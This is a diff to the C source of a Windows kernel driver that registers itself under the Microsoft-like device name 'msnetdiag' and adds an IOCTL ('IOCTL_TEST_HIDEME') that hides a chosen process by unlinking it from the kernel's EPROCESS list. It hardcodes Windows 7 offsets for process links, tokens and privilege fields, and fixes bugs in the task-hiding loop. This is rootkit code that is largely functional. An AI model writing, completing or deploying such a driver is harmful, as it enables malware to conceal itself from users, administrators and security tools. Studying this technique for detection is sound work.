@@ -3,37 +3,72 @@
 #include "stdio.h"
 #include "stdlib.h"
 
-typedef BOOLEAN BOOL;
-typedef unsigned long DWORD;
-typedef DWORD * PDWORD;
-typedef unsigned char BYTE;
-typedef struct offset {
-	BOOL isSupported;
-	DWORD ProcPID;
-	DWORD ProcName;
-	DWORD ProcLinks;
-	DWORD DriverSection;
-	DWORD Token;
-	DWORD nSIDS;
-	DWORD PrivPresent;
-	DWORD PrivEnable;
-	DWORD PrivDefaultEnable;
-}offset;
-
-
-#define FILE_DEVICE_RK 0x00008001
-#define IOCTL_TEST_HIDEME CTL_CODE(FILE_DEVICE_RK,0x801,METHOD_BUFFERED,FILE_READ_DATA|FILE_WRITE_DATA)
-
-#define SZ_EPROCESS_NAME 0x010
-#define EPROCESS_OFFSET_PID Offset.ProcPID
-#define EPROCESS_OFFSET_NAME Offset.ProcName
-#define EPROCESS_OFFSET_LINKS Offset.ProcLinks
-
 const WCHAR DeviceNameBuffer[] = L"\\Device\\msnetdiag";
 const WCHAR DeviceLinkBuffer[] = L"\\DosDevices\\msnetdiag";
 PDRIVER_OBJECT DriverObjectRef;
 PDRIVER_OBJECT MSNetDiagDeviceObject;
 offset Offset;
+
+BOOLEAN isOSSupported()
+{
+	return Offset.isSupported;
+}
+
+void checkOSVersion()
+{
+	NTSTATUS retVal;
+	RTL_OSVERSIONINFOW versionInfo;
+
+	versionInfo.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW);
+	retVal = RtlGetVersion(&versionInfo);
+
+	Offset.isSupported = TRUE;
+
+	DBG_PRINT2("[checkOSVersion]:Major #=%d", versionInfo.dwMajorVersion);
+	switch (versionInfo.dwMajorVersion) {
+	case 4:
+	{
+		DBG_TRACE("checkOSVersion", "OS=NT");
+		Offset.isSupported = FALSE;
+	}
+	break;
+	case 5:
+	{
+		DBG_TRACE("checkOSVersion", "OS=2000, XP, Server 2003");
+		Offset.isSupported = FALSE;
+	}
+	break;
+	case 6:
+	{
+		DBG_TRACE("checkOSVersion", "OS=Windows 7");
+		Offset.isSupported = TRUE;
+		Offset.ProcPID = 0x0b4;
+		Offset.ProcName = 0x16c;
+		Offset.ProcLinks = 0x0b8;
+		Offset.DriverSection = 0x014;
+		Offset.Token = 0x0f8;
+		Offset.nSIDS = 0x078;
+		Offset.PrivPresent = 0x040;
+		Offset.PrivEnable = 0x048;
+		Offset.PrivDefaultEnable = 0x050;
+		DBG_PRINT2("ProcID=%03x%", Offset.ProcPID);
+		DBG_PRINT2("ProcName=%03x%", Offset.ProcName);
+		DBG_PRINT2("ProcLinks=%03x%", Offset.ProcLinks);
+		DBG_PRINT2("DriverSection=%03x%", Offset.DriverSection);
+		DBG_PRINT2("Token=%03x%", Offset.Token);
+		DBG_PRINT2("nSIDS=%03x%", Offset.nSIDS);
+		DBG_PRINT2("PrivPresent=%03x%", Offset.PrivPresent);
+		DBG_PRINT2("PrivEnable=%03x%", Offset.PrivEnable);
+		DBG_PRINT2("PrivDefaultEnable=%03x%", Offset.PrivDefaultEnable);
+	}
+	break;
+	default:
+	{
+		Offset.isSupported = FALSE;
+	}
+	}
+	return;
+}
 
 int getPID(BYTE* currentPEP)
 {
@@ -123,6 +158,7 @@ void modifyTaskList(DWORD pid)
 	startPID = currentPID;
 	if (currentPID == pid) {
 		modifyTaskListEntry(currentPEP);
+		DBG_PRINT2("modifyTaskList:Search[DONE] PID=%d Hidden\n", pid);
 		return;
 	}
 
@@ -131,8 +167,9 @@ void modifyTaskList(DWORD pid)
 	currentPID = getPID(currentPEP);
 	getTaskName(name, (currentPEP + EPROCESS_OFFSET_NAME));
 	while (startPID != currentPID) {
-		if (currentPID = pid) {
+		if (currentPID == pid) {
 			modifyTaskListEntry(currentPEP);
+			DBG_PRINT2("modifyTaskList:Search[DONE] PID=%d Hidden\n", pid);
 			return;
 		}
 		nextPEP = getNextPEP(currentPEP);
@@ -143,7 +180,29 @@ void modifyTaskList(DWORD pid)
 		if (fuse == BLOWN)
 			return;
 	}
+
+	DBG_PRINT2("    %d Tasks Listed\n", fuse);
+	DBG_PRINT2("modifyTaskList: No task found with PID=%d\n", pid);
 	return;
+}
+
+void LowerIRQL(KIRQL prev)
+{
+	KeLowerIrql(prev);
+	return;
+}
+
+KIRQL RaiseIRQL()
+{
+	KIRQL curr;
+	KIRQL prev;
+
+	curr = KeGetCurrentIrql();
+	prev = curr;
+	if (curr < DISPATCH_LEVEL) {
+		KeRaiseIrql(DISPATCH_LEVEL, &prev);
+	}
+	return prev;
 }
 
 void HideTask(DWORD* pid)
@@ -183,7 +242,7 @@ NTSTATUS RegisterDriverDeviceLink()
 	NTSTATUS ntStatus;
 	UNICODE_STRING unicodeString;
 	UNICODE_STRING unicodeLinkString;
-	RelInitUnicodeString(&unicodeString, DeviceNameBuffer);
+	RtlInitUnicodeString(&unicodeString, DeviceNameBuffer);
 	RtlInitUnicodeString(&unicodeLinkString, DeviceLinkBuffer);
 	ntStatus = IoCreateSymbolicLink
 	(
@@ -199,9 +258,14 @@ VOID Unload(IN PDRIVER_OBJECT DriverObject)
 	PDEVICE_OBJECT deviceObj;
 	deviceObj = (*DriverObject).DeviceObject;
 
+	DBG_TRACE("OnUnload", "Received signal to unload the driver");
+
 	if (deviceObj != NULL) {
+		DBG_TRACE("OnUnload", "Unregistering driver's symbolic link");
 		RtlInitUnicodeString(&unicodeString, DeviceLinkBuffer);
 		IoDeleteSymbolicLink(&unicodeString);
+
+		DBG_TRACE("OnUnload", "Unregistering driver's device name");
 		IoDeleteDevice((*DriverObject).DeviceObject);
 	}
 	return;
@@ -231,6 +295,7 @@ NTSTATUS dispatchIOControl
 	PVOID		outputBuffer;
 	ULONG		inBufferLength;
 	ULONG		outBufferLength;
+	DWORD		ioctrlcode;
 	NTSTATUS	ntStatus;
 
 	ntStatus = STATUS_SUCCESS;
@@ -243,10 +308,22 @@ NTSTATUS dispatchIOControl
 	irpStack = IoGetCurrentIrpStackLocation(IRP);
 	inBufferLength = (*irpStack).Parameters.DeviceIoControl.InputBufferLength;
 	outBufferLength = (*irpStack).Parameters.DeviceIoControl.OutputBufferLength;
-	DWORD ioctrlcode = (*irpStack).Parameters.DeviceIoControl.IoControlCode;
+	ioctrlcode=(*irpStack).Parameters.DeviceIoControl.IoControlCode;
 
 	switch (ioctrlcode)
 	{
+	case IOCTL_TEST_HIDEME:
+	{
+		DWORD* pid;
+		if (inBufferLength < sizeof(DWORD) || inputBuffer == NULL) {
+			((*IRP).IoStatus).Status = STATUS_INVALID_BUFFER_SIZE;
+			break;
+		}
+		pid = (DWORD*)inputBuffer;
+		HideTask(pid);
+	}
+	break;
+
 	}
 
 	IoCompleteRequest(IRP, IO_NO_INCREMENT);
@@ -260,6 +337,27 @@ NTSTATUS DriverEntry(
 {
 	int i;
 	NTSTATUS ntStatus;
+
+	DBG_TRACE("Drive Entry", "Driver has been loaded");
+
+	checkOSVersion();
+	if (!isOSSupported()) {
+		return STATUS_OS_NOT_SUPPORT;
+	}
+
+	DBG_TRACE("Driver Entry", "Registering driver's device name");
+	ntStatus = RegisterDriverDeviceName(DriverObject);
+	if (!NT_SUCCESS(ntStatus)) {
+		DBG_TRACE("Driver Entry", "Failed to create device");
+		return ntStatus;
+	}
+	DBG_TRACE("Driver Entry", "Registering driver's symbolic link");
+	ntStatus = RegisterDriverDeviceLink();
+	if (!NT_SUCCESS(ntStatus)) {
+		DBG_TRACE("Driver Entry", "Failed to create symbolic link");
+		return ntStatus;
+	}
+
 	for (i = 0;i<IRP_MJ_MAXIMUM_FUNCTION;i++) {
 		(*DriverObject).MajorFunction[i] = defaultDispatch;
 	}
